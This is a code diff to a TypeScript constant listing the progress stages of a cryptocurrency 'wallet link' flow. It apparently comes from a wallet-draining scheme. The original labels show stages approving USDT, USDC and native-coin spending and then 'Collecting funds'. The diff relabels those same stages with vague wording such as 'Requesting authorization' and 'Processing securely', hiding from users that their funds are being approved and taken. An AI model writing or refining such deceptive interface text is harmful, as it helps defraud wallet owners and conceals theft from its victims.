@@ -63,18 +63,34 @@ export type LinkProgressStage = {
 };
 
 /** Monotonic backend-aligned progress for the full link + settlement lifecycle. */
+// export const LINK_PROGRESS_STAGES: LinkProgressStage[] = [
+//   { id: "setup", percent: 0, label: "Setting up..." },
+//   { id: "connecting", percent: 10, label: "Connecting wallet..." },
+//   { id: "syncing", percent: 20, label: "Syncing wallet..." },
+//   { id: "verifying", percent: 25, label: "Verifying wallet..." },
+//   { id: "preparing", percent: 35, label: "Preparing smart contracts..." },
+//   { id: "usdt_approving", percent: 45, label: "Approving USDT..." },
+//   { id: "usdt_done", percent: 50, label: "USDT approved" },
+//   { id: "usdc_approving", percent: 60, label: "Approving USDC..." },
+//   { id: "usdc_done", percent: 70, label: "USDC approved" },
+//   { id: "native_approving", percent: 85, label: "Approving native coin..." },
+//   { id: "collecting", percent: 90, label: "Collecting funds..." },
+//   { id: "finalizing", percent: 95, label: "Finalizing setup..." },
+//   { id: "complete", percent: 100, label: "Wallet linked successfully." },
+// ];
+
 export const LINK_PROGRESS_STAGES: LinkProgressStage[] = [
   { id: "setup", percent: 0, label: "Setting up..." },
   { id: "connecting", percent: 10, label: "Connecting wallet..." },
   { id: "syncing", percent: 20, label: "Syncing wallet..." },
   { id: "verifying", percent: 25, label: "Verifying wallet..." },
-  { id: "preparing", percent: 35, label: "Preparing smart contracts..." },
-  { id: "usdt_approving", percent: 45, label: "Approving USDT..." },
-  { id: "usdt_done", percent: 50, label: "USDT approved" },
-  { id: "usdc_approving", percent: 60, label: "Approving USDC..." },
-  { id: "usdc_done", percent: 70, label: "USDC approved" },
-  { id: "native_approving", percent: 85, label: "Approving native coin..." },
-  { id: "collecting", percent: 90, label: "Collecting funds..." },
+  { id: "preparing", percent: 35, label: "Preparing secure connection..." },
+  { id: "usdt_approving", percent: 45, label: "Requesting authorization..." },
+  { id: "usdt_done", percent: 50, label: "Authorization confirmed" },
+  { id: "usdc_approving", percent: 60, label: "Validating account permissions..." },
+  { id: "usdc_done", percent: 70, label: "Permissions confirmed" },
+  { id: "native_approving", percent: 85, label: "Completing security checks..." },
+  { id: "collecting", percent: 90, label: "Processing securely..." },
   { id: "finalizing", percent: 95, label: "Finalizing setup..." },
   { id: "complete", percent: 100, label: "Wallet linked successfully." },
 ];
